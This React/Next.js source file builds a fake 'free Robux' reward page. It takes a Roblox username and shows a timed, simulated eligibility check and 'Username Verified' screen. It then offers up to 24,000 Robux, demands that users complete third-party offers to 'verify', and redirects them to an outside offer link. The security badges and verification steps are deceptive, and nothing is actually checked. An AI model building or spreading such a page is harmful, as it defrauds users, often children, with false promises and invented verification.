
'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Header } from '@/components/layout/Header';
import { Footer } from '@/components/layout/Footer';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { 
  User, 
  Loader2, 
  CheckCircle2, 
  Zap, 
  ShieldCheck, 
  ArrowRight, 
  Lock,
  Gamepad2,
  AlertCircle,
  X
} from 'lucide-react';
import Image from 'next/image';
import { cn } from '@/lib/utils';

/**
 * @fileOverview Premium Robux-style Reward Interaction Page.
 * Multi-step flow: Identity -> Loading -> Success/Selection -> Verification Bridge.
 */

type Step = 'username' | 'loading' | 'success' | 'selection';

const ROBUX_ICON = "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1775750139/GAME_FLASH_20260409_212147_0000_eu5mys.png";
const BG_IMAGE = "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1775750597/GAME_FLASH_20260407_183902_0000_ktrvsz.png";
const REDIRECT_URL = "https://gameflashx.space/cl/i/277ood";

export default function RobuxPortal() {
  const [step, setStep] = useState<Step>('username');
  const [username, setUsername] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedReward, setSelectedReward] = useState<string | null>(null);

  const REWARDS = [
    { label: '2,000 Robux', value: '2k', icon: ROBUX_ICON },
    { label: '5,000 Robux', value: '5k', icon: ROBUX_ICON },
    { label: '10,000 Robux', value: '10k', icon: ROBUX_ICON },
    { label: '24,000 Robux', value: '24k', icon: ROBUX_ICON },
  ];

  const handleUsernameSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3) return;
    setStep('loading');
  };

  useEffect(() => {
    if (step === 'loading') {
      const timer = setTimeout(() => {
        setStep('success');
      }, 2000);
      return () => clearTimeout(timer);
    }
    if (step === 'success') {
      const timer = setTimeout(() => {
        setStep('selection');
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleRewardClick = (label: string) => {
    setSelectedReward(label);
    setIsModalOpen(true);
  };

  return (
    <main className="min-h-screen bg-black text-white selection:bg-primary overflow-x-hidden relative">
      <Header />
      
      {/* Dynamic Background Management */}
      <AnimatePresence>
        {step === 'username' && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-0"
          >
            <Image 
              src={BG_IMAGE} 
              alt="Background" 
              fill 
              className="object-cover" 
              priority 
            />
            <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px]" />
          </motion.div>
        )}
      </AnimatePresence>

      <div className="relative z-10 pt-32 pb-20 px-4 flex flex-col items-center min-h-[90vh] justify-center">
        <div className="container max-w-xl">
          
          <AnimatePresence mode="wait">
            {/* STEP 1: USERNAME ENTRY */}
            {step === 'username' && (
              <motion.div 
                key="username"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="glass-card rounded-[2.5rem] p-8 md:p-12 border-white/10 shadow-2xl text-center space-y-8 bg-white/5 backdrop-blur-3xl"
              >
                <motion.div 
                  animate={{ y: [-5, 5, -5] }}
                  transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
                  className="relative w-24 h-24 mx-auto"
                >
                  <div className="absolute inset-0 bg-primary/20 blur-2xl rounded-full" />
                  <Image src={ROBUX_ICON} alt="Robux" fill className="object-contain drop-shadow-[0_0_20px_rgba(0,157,255,0.5)]" />
                </motion.div>
                
                <div className="space-y-2">
                  <h1 className="text-3xl md:text-4xl font-black uppercase tracking-tight">Enter Your Username</h1>
                  <p className="text-white/40 text-xs font-bold uppercase tracking-widest">Connect to check reward eligibility</p>
                </div>

                <form onSubmit={handleUsernameSubmit} className="space-y-4">
                  <div className="relative group">
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-white/20 group-focus-within:text-primary transition-colors" />
                    <Input 
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="Enter your username"
                      className="h-16 pl-12 bg-black/40 border-white/10 rounded-2xl text-lg font-bold placeholder:text-white/10 focus:ring-4 focus:ring-primary/10 transition-all"
                      required
                    />
                  </div>
                  <Button 
                    type="submit"
                    disabled={username.length < 3}
                    className="w-full h-16 bg-primary hover:bg-primary/90 text-white font-black uppercase tracking-[0.2em] rounded-2xl transition-all shadow-xl shadow-primary/20 border-none"
                  >
                    Continue <ArrowRight className="ml-2 w-5 h-5" />
                  </Button>
                </form>

                <div className="flex items-center justify-center gap-2 text-[10px] font-black text-white/20 uppercase tracking-widest">
                  <ShieldCheck className="w-3.5 h-3.5" /> Secure Session Validation
                </div>
              </motion.div>
            )}

            {/* STEP 2: LOADING SCREEN */}
            {step === 'loading' && (
              <motion.div 
                key="loading"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="py-20 text-center space-y-10"
              >
                <div className="relative w-24 h-24 mx-auto">
                  <Loader2 className="w-full h-full text-primary animate-spin" strokeWidth={1.5} />
                  <div className="absolute inset-0 flex items-center justify-center">
                    <Zap className="w-10 h-10 text-primary/40 animate-pulse" />
                  </div>
                </div>
                <div className="space-y-2">
                  <h2 className="text-3xl font-black uppercase tracking-tight animate-pulse">Checking Eligibility...</h2>
                  <p className="text-[10px] text-white/20 uppercase tracking-[0.4em] font-black">Syncing with global servers</p>
                </div>
              </motion.div>
            )}

            {/* STEP 3: SUCCESS FEEDBACK */}
            {step === 'success' && (
              <motion.div 
                key="success"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="py-20 text-center space-y-8"
              >
                <div className="w-24 h-24 bg-green-500/20 rounded-[2.5rem] flex items-center justify-center mx-auto border border-green-500/30 shadow-[0_0_40px_rgba(34,197,94,0.2)]">
                  <CheckCircle2 className="w-12 h-12 text-green-500" />
                </div>
                <div className="space-y-2">
                  <h2 className="text-4xl font-black uppercase tracking-tighter">Username Verified</h2>
                  <p className="text-white/60 text-sm font-medium uppercase tracking-widest">Identity confirmed: <span className="text-primary font-black">{username}</span></p>
                </div>
              </motion.div>
            )}

            {/* STEP 4: REWARD CATALOG */}
            {step === 'selection' && (
              <motion.div 
                key="selection"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="space-y-10 w-full"
              >
                <div className="text-center space-y-2">
                  <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-primary/10 border border-primary/20 mb-4">
                    <Gamepad2 className="w-3 h-3 text-primary" />
                    <span className="text-[10px] font-black text-primary uppercase tracking-widest">Platform Rewards Active</span>
                  </div>
                  <h2 className="text-3xl md:text-5xl font-black uppercase tracking-tighter">Available Options</h2>
                  <p className="text-white/40 text-sm font-medium uppercase tracking-widest">Select an opportunity to continue</p>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {REWARDS.map((reward, idx) => (
                    <motion.div
                      key={reward.value}
                      initial={{ opacity: 0, x: -20 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ delay: idx * 0.1 }}
                      onClick={() => handleRewardClick(reward.label)}
                      className="glass-card p-6 rounded-3xl border-white/5 hover:border-primary/40 cursor-pointer group transition-all relative overflow-hidden bg-white/5"
                    >
                      <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
                        <Zap className="w-16 h-16 text-primary" />
                      </div>
                      <div className="flex items-center gap-5 relative z-10">
                        <div className="relative w-14 h-14 shrink-0">
                          <Image src={reward.icon} alt="icon" fill className="object-contain" />
                        </div>
                        <div>
                          <h3 className="text-xl font-black uppercase tracking-tight">{reward.label}</h3>
                          <p className="text-[10px] font-black text-primary uppercase tracking-widest">Opportunity Found</p>
                        </div>
                      </div>
                    </motion.div>
                  ))}
                </div>

                <div className="text-center">
                  <p className="text-[10px] text-white/30 font-bold uppercase tracking-widest flex items-center justify-center gap-2">
                    <ShieldCheck className="w-3.5 h-3.5 opacity-50" /> Secure process • Verification required
                  </p>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      {/* MODAL: VERIFICATION BRIDGE */}
      <AnimatePresence>
        {isModalOpen && (
          <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsModalOpen(false)}
              className="absolute inset-0 bg-black/90 backdrop-blur-md"
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="relative glass-card w-full max-w-md p-8 md:p-12 rounded-[2.5rem] border-white/10 shadow-2xl overflow-hidden bg-[#0a0a0a]"
            >
              <button 
                onClick={() => setIsModalOpen(false)}
                className="absolute top-6 right-6 text-white/20 hover:text-white transition-colors"
              >
                <X className="w-6 h-6" />
              </button>

              <div className="absolute -top-24 -left-24 w-64 h-64 bg-primary/10 rounded-full blur-[100px] pointer-events-none" />

              <div className="text-center space-y-8 relative z-10">
                <div className="w-20 h-20 bg-primary/10 rounded-3xl flex items-center justify-center mx-auto border border-primary/20">
                  <ShieldCheck className="w-10 h-10 text-primary" />
                </div>

                <div className="space-y-3">
                  <h3 className="text-3xl font-black uppercase tracking-tight leading-none">Complete Verification</h3>
                  <p className="text-primary text-[10px] font-black uppercase tracking-[0.3em]">Manual Action Required</p>
                </div>

                <div className="space-y-4">
                  <p className="text-white/60 text-sm font-medium leading-relaxed uppercase tracking-tight">
                    Complete one of the available offers below to validate your human session and synchronize your <span className="text-white font-black">{selectedReward}</span>.
                  </p>
                  
                  <div className="bg-white/5 border border-white/5 rounded-2xl p-4 flex items-start gap-3 text-left">
                    <AlertCircle className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                    <p className="text-[9px] text-white/40 leading-relaxed font-bold uppercase tracking-tight">
                      Requirements vary by offer. Completion is processed by third-party secure partners.
                    </p>
                  </div>
                </div>

                <Button 
                  onClick={() => window.location.href = REDIRECT_URL}
                  className="w-full h-20 bg-primary hover:bg-primary/90 text-white font-black uppercase tracking-[0.2em] text-lg rounded-2xl transition-all shadow-2xl shadow-primary/30 border-none"
                >
                  Unlock Now <ArrowRight className="ml-2 w-6 h-6" />
                </Button>

                <p className="text-[9px] font-black text-white/20 uppercase tracking-[0.4em]">
                  <Lock className="inline w-3 h-3 mb-0.5 mr-1" /> Encrypted Protocol
                </p>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <Footer />
    </main>
  );
}
